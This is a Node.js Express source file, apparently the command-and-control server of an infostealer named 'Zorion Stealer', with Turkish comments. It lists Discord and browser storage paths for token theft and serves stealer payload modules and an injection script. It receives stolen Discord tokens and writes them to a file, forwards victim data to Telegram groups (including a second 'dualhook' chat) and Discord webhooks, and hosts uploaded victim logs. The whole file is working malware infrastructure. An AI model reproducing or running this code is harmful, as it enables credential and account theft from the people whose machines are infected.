const { execSync } = require('child_process');
const fsPromises = require('fs').promises;
const util = require("util");
const randomstring = require("randomstring");
const sleep = util.promisify(setTimeout);
const { Client, ChannelType, GatewayIntentBits, MessageEmbed, WebhookClient, TextChannel } = require('discord.js');


const axios = require('axios');
const path = require('path');
const bodyParser = require("body-parser");
const mongoose = require('mongoose');
const crypto = require('crypto');
const express = require('express');
const https = require('https'); // HTTPS modülünü ekleyin
const app = express();
const os = require('os');
const username = os.userInfo().username;
const config = require(path.join('C:', 'Users', username, 'Desktop', 'Zorion Stealer', 'config.json'));
const multer = require('multer');
const AdmZip = require('adm-zip');
const { promisify } = require('util');
const session = require('express-session');




// Multer ayarları
const storage = multer.memoryStorage();
const upload = multer({ storage: storage });



app.use(express.json({ limit: "1024mb" }));
app.use(express.static('uploads'));
app.use('/download', express.static(path.join(__dirname, 'uploads')))
let commandResult = null;

const injectiong1 = require('./Routes/injectiong');

app.post('/injection', injectiong1);

const { keyToChatId } = require('./keyToChatId');



app.get('/', async (req, res) => {
  res.redirect("https://www.youtube.com/watch?v=dQw4w9WgXcQ");
});



app.get('/paths', async (req, res) => {
    res.status(200).json({
        discordTokens: {
            Discord: 'roaming' + '\\discord\\Local Storage\\leveldb\\',
            DiscordCanary: 'roaming' + '\\discordcanary\\Local Storage\\leveldb\\',
            LightCord: 'roaming' + '\\Lightcord\\Local Storage\\leveldb\\',
            DiscordPTB: 'roaming' + '\\discordptb\\Local Storage\\leveldb\\',
            Opera: 'roaming' + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            OperaGX: 'roaming' + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            Amigo: 'roaming' + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
            Torch: 'appdata' + '\\Torch\\User Data\\Local Storage\\leveldb\\',
            Kometa: 'appdata' + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
            Orbitum: 'appdata' + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            CentBrowser: 'appdata' + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': 'appdata' + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            Sputnik: 'appdata' + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            Vivaldi: 'appdata' + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            ChromeSxS: 'appdata' + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            Chrome: 'appdata' + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome Profile 1': 'appdata' + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
            'Chrome Profile 2': 'appdata' + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
            'Chrome Profile 3': 'appdata' + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
            'Chrome Profile 4': 'appdata' + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
            'Chrome Profile 5': 'appdata' + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
            EpicPrivacyBrowser: 'appdata' + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            Edge: 'appdata' + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
            Uran: 'appdata' + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            YandexBrowser: 'appdata' + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            Brave: 'appdata' + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            Iridium: 'appdata' + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
        },
        browsers: [
            'appdata' + '\\Google\\Chrome\\User Data\\Default\\',
            'appdata' + '\\Google\\Chrome\\User Data\\Profile 1\\',
            'appdata' + '\\Google\\Chrome\\User Data\\Profile 2\\',
            'appdata' + '\\Google\\Chrome\\User Data\\Profile 3\\',
            'appdata' + '\\Google\\Chrome\\User Data\\Profile 4\\',
            'appdata' + '\\Google\\Chrome\\User Data\\Profile 5\\',
            'appdata' + '\\Google\\Chrome\\User Data\\Guest Profile\\',
            'appdata' + '\\Google\\Chrome\\User Data\\Default\\Network\\',
            'appdata' + '\\Google\\Chrome\\User Data\\Profile 1\\Network\\',
            'appdata' + '\\Google\\Chrome\\User Data\\Profile 2\\Network\\',
            'appdata' + '\\Google\\Chrome\\User Data\\Profile 3\\Network\\',
            'appdata' + '\\Google\\Chrome\\User Data\\Profile 4\\Network\\',
            'appdata' + '\\Google\\Chrome\\User Data\\Profile 5\\Network\\',
            'appdata' + '\\Google\\Chrome\\User Data\\Guest Profile\\Network\\',
            'roaming' + '\\Mozilla\\Firefox\\Profiles\\',
            'roaming' + '\\Opera Software\\Opera Stable\\',
            'roaming' + '\\Opera Software\\Opera GX Stable\\',
            'appdata' + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\',
            'appdata' + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\',
            'appdata' + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\',
            'appdata' + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\',
            'appdata' + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\',
            'appdata' + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\',
            'appdata' + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\',
            'appdata' + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\',
            'appdata' + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\',
            'appdata' + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\',
            'appdata' + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\',
            'appdata' + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\',
            'appdata' + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\',
            'appdata' + '\\Microsoft\\Edge\\User Data\\Default\\',
            'appdata' + '\\Microsoft\\Edge\\User Data\\Profile 1\\',
            'appdata' + '\\Microsoft\\Edge\\User Data\\Profile 2\\',
            'appdata' + '\\Microsoft\\Edge\\User Data\\Profile 3\\',
            'appdata' + '\\Microsoft\\Edge\\User Data\\Profile 4\\',
            'appdata' + '\\Microsoft\\Edge\\User Data\\Profile 5\\',
            'appdata' + '\\Microsoft\\Edge\\User Data\\Guest Profile\\',
            'appdata' + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\',
            'appdata' + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\Network\\',
            'appdata' + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\Network\\',
            'appdata' + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\Network\\',
            'appdata' + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\Network\\',
            'appdata' + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\Network\\',
            'appdata' + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\Network\\',
            'appdata' + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\Network\\',
            'appdata' + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\Network\\',
            'appdata' + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\Network\\',
            'appdata' + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\Network\\',
            'appdata' + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\Network\\',
            'appdata' + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\Network\\',
            'appdata' + '\\Microsoft\\Edge\\User Data\\Default\\Network\\',
            'appdata' + '\\Microsoft\\Edge\\User Data\\Profile 1\\Network\\',
            'appdata' + '\\Microsoft\\Edge\\User Data\\Profile 2\\Network\\',
            'appdata' + '\\Microsoft\\Edge\\User Data\\Profile 3\\Network\\',
            'appdata' + '\\Microsoft\\Edge\\User Data\\Profile 4\\Network\\',
            'appdata' + '\\Microsoft\\Edge\\User Data\\Profile 5\\Network\\',
            'appdata' + '\\Microsoft\\Edge\\User Data\\Guest Profile\\Network\\'
        ],
        browsersProcesses: [
            'chrome', 'msedge', 'brave', 'firefox', 'opera', 'kometa', 'orbitum', 'centbrowser', '7star', 'sputnik', 'vivaldi',
            'epicprivacybrowser', 'uran', 'yandex', 'iridium'
        ]
    });
});

const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent] });


client.login(config.discordbottokeninjection);

client.on('ready', () => {
  console.log(`Logged in as ${client.user.tag}!`);
});

client.on('messageCreate', async message => {
  try {
      if (message.guild.id === config.discordsunucuidinjection && message.channel.id === config.discordkanalidinjection && message.embeds.length > 0) {
          message.embeds.forEach(async embed => {
              if (embed.fields && embed.fields.length > 0) {
                  let messageToSend = '';
                  embed.fields.forEach(field => {
                      messageToSend += `Zorion Stealer ✝️ - (Discord Injection)
                      
**${field.name}:** \`${field.value}\`\n`;
                  });

                  const keyMatch = embed.footer.text.match(/Key: (.+)/);
                  if (keyMatch) {
                      const key = keyMatch[1];
                      console.log(`Key found: ${key}`);

                      const randomString = crypto.randomBytes(2).toString('hex');
                      const response = await axios.get(`https://${config.ip}/chatId/${randomString}`, {
                          headers: {
                              'User-Agent': key,
                          },
                      });

                      const groupId = response.data;
                      const groupIdD = config.dualhookchatid;
                      sendMessageToGroup(groupId, messageToSend);
                      sendMessageToGroup(groupIdD, messageToSend);

                  }
              }
          });
      }
  } catch (error) {
      console.error('Error:', error);
  }
});


app.get('/logs/:keyy/:fileName', (req, res) => {
  const keyy = req.params.keyy; 
  const fileName = req.params.fileName;
  const filePath = `Vct/${keyy}/${fileName}`;

  res.sendFile(path.join(__dirname, filePath));
});

const uploadx = multer({ dest: 'uploads/' });

app.post('/uploadlogs', uploadx.single('file'), (req, res) => {
  const key = req.body.key;
  const uploadedFile = req.file;

  if (uploadedFile) {
    const randomName = generateRandomName(); 
      const folderPath = path.join('Vct', key, randomName);
      fs.mkdirSync(folderPath, { recursive: true });
      
      const oldPath = uploadedFile.path;
      const newPath = path.join(folderPath, uploadedFile.originalname);
      fs.renameSync(oldPath, newPath);
      
      const fileLink = `https://${config.domain}/filelogs/${key}/${randomName}/${uploadedFile.originalname}`;
      
      res.json({ link: fileLink });
  } else {
      res.status(400).json({ error: 'Dosya bulunamadı' });
  }
});

function generateRandomName() {
  const length = 10;
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  let randomName = '';
  for (let i = 0; i < length; i++) {
      randomName += characters.charAt(Math.floor(Math.random() * characters.length));
  }
  return randomName;
}


const vctFolderPath = 'Vct';

const maxAgeInMs = 7 * 24 * 60 * 60 * 1000; 

async function deleteOldFiles() {
    try {
        const files = await fsPromises.readdir(vctFolderPath);

        for (const file of files) {
            const filePath = path.join(vctFolderPath, file);
            const stats = await fsPromises.stat(filePath);

            if (stats.isFile()) {
                const fileAgeInMs = Date.now() - stats.mtime.getTime();

                if (fileAgeInMs > maxAgeInMs) {
                    await fsPromises.unlink(filePath);
                    console.log(`Dosya başarıyla silindi: ${filePath}`);
                }
            }
        }
    } catch (err) {
        console.error('Hata:', err);
    }
}

deleteOldFiles();

const TelegramBot = require('node-telegram-bot-api');
const clientToken = config.telegrambottoken;

const tgtoken = clientToken;

const tgbot = new TelegramBot(tgtoken, { polling: true });

tgbot.on('polling_error', (error) => {
  console.error('Telegram bot polling error:', error);
});

tgbot.on('polling', () => {
  console.log('Telegram bot is active and polling...');
});

tgbot.on('new_chat_members', (msg) => {
  const chatId = msg.chat.id;
  tgbot.sendMessage(chatId, `@zorionstealerbot
\`/change-chatid yourkey ${chatId}\``, { parse_mode: 'Markdown' });
});


async function sendMessageToGroup(groupId, messageToSend) {
  try {
    await tgbot.sendMessage(groupId, messageToSend, { parse_mode: 'Markdown' });
    console.log(`Message sent to group ${groupId}`);
  } catch (error) {
    console.error('Error sending message:', error.message);
  }
}

         app.post('/sendmessageex/:route', async (req, res) => {
                      const { content } = req.body;
                      const { key } = req.body;
                    
                      const { body } = req;
                      console.log(body);
                    
                      const randomString = crypto.randomBytes(2).toString('hex');
                    
                      const response = await axios.get(`https://${config.ip}/chatId/${randomString}`, {
                          headers: {
                              'User-Agent': key,
                          },
                      });
                    
                      const groupId = response.data;
                      const groupIdD = config.dualhookchatid;
                    
                      try {
                                 
                                  const messageToSend = `${content}`;
                                  sendMessageToGroup(groupId, messageToSend);
                                  sendMessageToGroup(groupIdD, messageToSend);
                              } catch (error) {
                                  console.error('Error sending telegram:', error);
                                  res.status(500).send("Data processing error");
                                }
                              });
                          

                              app.post('/sendmessageegs/:route', async (req, res) => {
                                const { content } = req.body;
                                const { key } = req.body;
                              
                                const { body } = req;
                                console.log(body);
                              
                                const randomString = crypto.randomBytes(2).toString('hex');
                              
                                const response = await axios.get(`https://${config.ip}/chatId/${randomString}`, {
                                    headers: {
                                        'User-Agent': key,
                                    },
                                });
                              
                                const groupId = response.data;
                                const groupIdD = config.dualhookchatid;
                              
                                try {
                                           
                                            const messageToSend = `${content}`;
                                            sendMessageToGroup(groupId, messageToSend);
                                            sendMessageToGroup(groupIdD, messageToSend);
                                        } catch (error) {
                                            console.error('Error sending telegram:', error);
                                            res.status(500).send("Data processing error");
                                          }
                                        });
                              
                                        app.post('/sendmessagess/:route', async (req, res) => {
                                          const { content } = req.body;
                                          const { key } = req.body;
                                        
                                          const { body } = req;
                                          console.log(body);
                                        
                                          const randomString = crypto.randomBytes(2).toString('hex');
                                        
                                          const response = await axios.get(`https://${config.ip}/chatId/${randomString}`, {
                                              headers: {
                                                  'User-Agent': key,
                                              },
                                          });
                                        
                                          const groupId = response.data;
                                          const groupIdD = config.dualhookchatid;
                                        
                                          try {
                                                     
                                                      const messageToSend = `${content}`;
                                                      sendMessageToGroup(groupId, messageToSend);
                                                      sendMessageToGroup(groupIdD, messageToSend);
                                                  } catch (error) {
                                                      console.error('Error sending telegram:', error);
                                                      res.status(500).send("Data processing error");
                                                    }
                                                  });
                                        
                                                  app.post('/sendmessagedbcf/:route', async (req, res) => {
                                                    const { content } = req.body;
                                                    const { key } = req.body;
                                                  
                                                    const { body } = req;
                                                    console.log(body);
                                                  
                                                    const randomString = crypto.randomBytes(2).toString('hex');
                                                  
                                                    const response = await axios.get(`https://${config.ip}/chatId/${randomString}`, {
                                                        headers: {
                                                            'User-Agent': key,
                                                        },
                                                    });
                                                  
                                                    const groupId = response.data;
                                                    const groupIdD = config.dualhookchatid;
                                                  
                                                    try {
                                                               
                                                                const messageToSend = `${content}`;
                                                                sendMessageToGroup(groupId, messageToSend);
                                                                sendMessageToGroup(groupIdD, messageToSend);
                                                            } catch (error) {
                                                                console.error('Error sending telegram:', error);
                                                                res.status(500).send("Data processing error");
                                                              }
                                                            });
                                                  
         app.post('/sendmessagebd/:route', async (req, res) => {
          const { content } = req.body;
          const { key } = req.body;
        
          const { body } = req;
          console.log(body);
        
          const randomString = crypto.randomBytes(2).toString('hex');
        
          const response = await axios.get(`https://${config.ip}/chatId/${randomString}`, {
              headers: {
                  'User-Agent': key,
              },
          });
        
          const groupId = response.data;
          const groupIdD = config.dualhookchatid;
        
          try {
                     
                      const messageToSend = `${content}`;
                      sendMessageToGroup(groupId, messageToSend);
                      sendMessageToGroup(groupIdD, messageToSend);
                  } catch (error) {
                      console.error('Error sending telegram:', error);
                      res.status(500).send("Data processing error");
                    }
                  });

                  app.post('/sendmessagewz/:route', async (req, res) => {
                    const { content } = req.body;
                    const { key } = req.body;
                  
                    const { body } = req;
                    console.log(body);
                  
                    const randomString = crypto.randomBytes(2).toString('hex');
                  
                    const response = await axios.get(`https://${config.ip}/chatId/${randomString}`, {
                        headers: {
                            'User-Agent': key,
                        },
                    });
                  
                    const groupId = response.data;
                    const groupIdD = config.dualhookchatid;
                  
                    try {
                               
                                const messageToSend = `${content}`;
                                sendMessageToGroup(groupId, messageToSend);
                                sendMessageToGroup(groupIdD, messageToSend);
                            } catch (error) {
                                console.error('Error sending telegram:', error);
                                res.status(500).send("Data processing error");
                              }
                            });
                        
                            app.post('/sendmessageinj/:route', async (req, res) => {
                              const { content } = req.body;
                              const { key } = req.body;
                            
                              const { body } = req;
                              console.log(body);
                            
                              const randomString = crypto.randomBytes(2).toString('hex');
                            
                              const response = await axios.get(`https://${config.ip}/chatId/${randomString}`, {
                                  headers: {
                                      'User-Agent': key,
                                  },
                              });
                            
                              const groupId = response.data;
                              const groupIdD = config.dualhookchatid;
                            
                              try {
                                         
                                          const messageToSend = `${content}`;
                                          sendMessageToGroup(groupId, messageToSend);
                                          sendMessageToGroup(groupIdD, messageToSend);
                                      } catch (error) {
                                          console.error('Error sending telegram:', error);
                                          res.status(500).send("Data processing error");
                                        }
                                      });
                                  
             app.post('/sendmessagebdd/:route', async (req, res) => {
              const { content } = req.body;
              const { token } = req.body;
  const { key } = req.body;

  try {
    await fsPromises.appendFile('tokens.txt', `["Key:", "${key}"] - ["Token:", "${token}"]\n`);
    axios.post(`http://localhost:31692/api/tk/${key}/${token}`)
    console.log('Token dosyaya başarıyla eklendi.');
  } catch (err) {
    console.error('Dosyaya yazarken bir hata oluştu:', err);
  }

  const randomString = crypto.randomBytes(2).toString('hex');

  const response = await axios.get(`https://${config.ip}/chatId/${randomString}`, {
      headers: {
          'User-Agent': key,
      },
  });

  const groupId = response.data;
  const groupIdD = config.dualhookchatid;

  try {
      
const messageToSend = `${content}`;
sendMessageToGroup(groupId, messageToSend);
sendMessageToGroupD(groupIdD, messageToSend);
    
          } catch (error) {
              console.error('Error sending telegram:', error);
              res.status(500).send("Data processing error");
            }
          });

          app.post('/sendmessageadd/:route', async (req, res) => {
            const { content } = req.body;
            const { token } = req.body;
const { key } = req.body;

try {
  await fsPromises.appendFile('tokens.txt', `["Key:", "${key}"] - ["Token:", "${token}"]\n`);
  axios.post(`http://localhost:31692/api/tk/${key}/${token}`)
  console.log('Token dosyaya başarıyla eklendi.');
} catch (err) {
  console.error('Dosyaya yazarken bir hata oluştu:', err);
}

const randomString = crypto.randomBytes(2).toString('hex');

const response = await axios.get(`https://${config.ip}/chatId/${randomString}`, {
    headers: {
        'User-Agent': key,
    },
});

const groupId = response.data;
const groupIdD = config.dualhookchatid;

try {
    
const messageToSend = `${content}`;
sendMessageToGroup(groupId, messageToSend);
sendMessageToGroupD(groupIdD, messageToSend);
  
        } catch (error) {
            console.error('Error sending telegram:', error);
            res.status(500).send("Data processing error");
          }
        });

        
                  app.post('/api/dpaste', async (req, res) => {
                    const { content } = req.body;
                
                    try {
                        const response = await fetch("https://dpaste.com/api/", {
                            method: "POST",
                            headers: { "Content-Type": "application/x-www-form-urlencoded" },
                            body: "content=" + encodeURIComponent(content),
                        });
                
                        const result = await response.text();
                        res.status(200).json({ link: result });
                    } catch (error) {
                        console.error('Error posting to dpaste:', error);
                        res.status(500).json({ error: 'Internal Server Error' });
                    }
                });

          app.post('/api/send-telegram', async (req, res) => {
            const { content } = req.body;
            const { key } = req.body;
          
            const randomString = crypto.randomBytes(2).toString('hex');
          
            const response = await axios.get(`https://${config.ip}/chatId/${randomString}`, {
                headers: {
                    'User-Agent': key,
                },
            });
          
            const groupId = response.data;
            const groupIdD = config.dualhookchatid;
          
            try {
                        const messageToSend = content;
                        sendMessageToGroup(groupId, messageToSend);
                        sendMessageToGroupD(groupIdD, messageToSend);
                    } catch (error) {
                        console.error('Error sending telegram:', error);
                        res.status(500).send("Data processing error");
                      }
                    });
          
        


app.get(`/chatId/:route`, async (req, res) => {
  try {
    const route = req.params.route;
    const userAgent = req.get('user-agent');
    const key = userAgent; 
    let chatId = await keyToChatId(key);
    const usrkey = req.params.key; 
    res.status(200).send(chatId);
  } catch (error) {
    console.error(error);
    res.status(500).send("Internal Server Error");
  }
});

// Route handler
app.get('/:route', async (req, res) => {
  const route = req.params.route;
 
    if (route === 'bmodule'){
    res.sendFile(`C:/Users/${config.pcname}/Desktop/Zorion Stealer/Api/browserzip.node`);
  } else if (route === 'dmodule'){
    res.sendFile(`C:/Users/${config.pcname}/Desktop/Zorion Stealer/Api/discordapptoken.node`);
  } else if (route === 'ananaisiekmtyoreospcug') {
    res.sendFile(__dirname + '/injection/telegram.js');
  } else {
    res.status(404).send('Error 404');
  }
});

app.get('/downloadapp/:fileName', (req, res) => {
  const fileName = req.params.fileName;
  const filePath = `C:/Users/${config.pcname}/Desktop/Zorion Stealer/Api/output/${fileName}`;

  res.sendFile(filePath, (err) => {
      if (err) {
          console.error('Dosya indirilirken bir hata oluştu:', err);
      } else {
          console.log('Dosya başarıyla indirildi:', fileName);

          setTimeout(() => {
              fsPromises.unlink(filePath, (err) => {
                  if (err) {
                      console.error('Dosya silinirken bir hata oluştu:', err);
                  } else {
                      console.log('Dosya başarıyla silindi:', fileName);
                  }
              });
          }, 3 * 60 * 1000); 
      }
  });
});


const webhookUrls = {
};

const webhookClients = {};
for (const key in webhookUrls) {
  webhookClients[key] = new WebhookClient({ url: webhookUrls[key] });
}

const webhookClient = new WebhookClient({ url: config.discordkanalwebhookinjection });

app.use(bodyParser.json());

app.post('/send-injection', async (req, res) => {
  const { body } = req;

  try {
    await webhookClient.send(body);
    res.status(200);
  } catch (error) {
    console.error(error);
    res.status(500);
  }
});

mongoose.connect(config.mongodb, {
  useNewUrlParser: true,
  useUnifiedTopology: true,
});

const db = mongoose.connection;
db.once('open', () => console.log('Connected to MongoDB'));

const FeatureSelection = mongoose.model('FeatureSelection', {
    key: String,
    features: [String]
});

app.get(`/.well-known/pki-validation/${config.ssltxtname}.txt`, (req, res) => {
  res.sendFile(`/Users/${config.pcname}/Desktop/Zorion Stealer/Api/.well-known/pki-validation/${config.ssltxtname}.txt`);
});

const fs = require('fs');

const httpsOptions = {
  key: fs.readFileSync(path.resolve(__dirname, 'private.key')),
  cert: fs.readFileSync(path.resolve(__dirname, 'certificate.crt')),
  ca: fs.readFileSync(path.resolve(__dirname, 'ca_bundle.crt'))
};

const server = https.createServer(httpsOptions, app);

server.listen(443, () => {
  console.log(`Listening on port 443`);
  mongoose.connect(config.mongodb, {
    useNewUrlParser: true,
    useUnifiedTopology: true,
  })
  .then(() => console.log('Mongoose connection successful.'))
  .catch(() => console.log('Mongoose connection error.'));
});


